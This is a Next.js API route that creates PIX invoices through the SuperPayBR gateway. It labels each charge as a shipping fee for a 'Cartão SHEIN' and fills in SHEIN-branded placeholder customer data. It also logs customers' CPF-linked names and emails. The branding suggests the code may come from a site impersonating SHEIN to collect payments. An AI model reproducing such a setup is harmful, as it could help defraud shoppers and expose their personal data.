import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA SUPERPAYBR ===")

    const body = await request.json()
    const { amount, shipping, method } = body

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")

    console.log("📋 Dados da fatura:", {
      amount,
      shipping,
      method,
      cliente: cpfData.nome,
      email: userEmail,
    })

    // Primeiro, fazer autenticação
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`)
    const authResult = await authResponse.json()

    if (!authResult.success) {
      throw new Error("Falha na autenticação SuperPayBR")
    }

    const accessToken = authResult.data.access_token

    // Preparar dados da fatura SuperPayBR
    const invoiceData = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
        address: {
          street: deliveryAddress.street || "Rua Principal",
          number: deliveryAddress.number || "123",
          district: deliveryAddress.neighborhood || "Centro",
          city: deliveryAddress.city || "São Paulo",
          state: deliveryAddress.state || "SP",
          zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01000000",
          country: "BR",
        },
        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
      },
      payment: {
        id: `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        type: "3", // PIX
        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        referer: `SHEIN_FRETE_${method}`,
        installment: "1",
        order_url: `${request.nextUrl.origin}/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: "1",
            image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
            title: `Frete ${method} - Cartão SHEIN`,
            qnt: "1",
            discount: 0,
            amount: Number.parseFloat(amount),
          },
        ],
      },
      shipping: {
        amount: 0.0,
      },
    }

    console.log("🚀 Enviando para SuperPayBR...")

    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
      },
      body: JSON.stringify(invoiceData),
    })

    console.log("📥 Resposta SuperPayBR:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
    })

    if (createResponse.ok) {
      const invoiceResult = await createResponse.json()
      console.log("✅ Fatura SuperPayBR criada com sucesso!")
      console.log("📋 Dados PIX recebidos:", invoiceResult.fatura?.pix)

      // Gerar QR Code usando QuickChart como fallback
      const pixPayload = invoiceResult.fatura?.pix?.payload
      const qrCodeUrl = pixPayload
        ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=200`
        : "/placeholder.svg?height=200&width=200"

      // Mapear resposta para formato esperado
      const mappedInvoice = {
        id: invoiceResult.fatura.id,
        invoice_id: invoiceResult.fatura.invoice_id,
        external_id: invoiceData.payment.id,
        pix: {
          payload: pixPayload || "",
          image: invoiceResult.fatura?.pix?.image || qrCodeUrl,
          qr_code: qrCodeUrl, // Usar QuickChart para garantir que funcione
        },
        status: {
          code: invoiceResult.fatura.status.code,
          title: invoiceResult.fatura.status.title,
          text: invoiceResult.fatura.status.text || "pending",
        },
        valores: {
          bruto: invoiceResult.fatura.valores.bruto,
          liquido: invoiceResult.fatura.valores.liquido,
        },
        vencimento: {
          dia: invoiceResult.fatura.vencimento.dia,
        },
        type: "real",
      }

      console.log("🎯 QR Code URL gerada:", qrCodeUrl)

      return NextResponse.json({
        success: true,
        data: mappedInvoice,
        raw_response: invoiceResult,
      })
    } else {
      const errorText = await createResponse.text()
      console.log("❌ Erro ao criar fatura SuperPayBR:", createResponse.status, errorText)

      return NextResponse.json(
        {
          success: false,
          error: `Erro SuperPayBR: ${createResponse.status} - ${errorText}`,
          fallback: true,
        },
        { status: createResponse.status },
      )
    }
  } catch (error) {
    console.log("❌ Erro ao criar fatura SuperPayBR:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Erro interno ao criar fatura SuperPayBR",
        fallback: true,
      },
      { status: 500 },
    )
  }
}
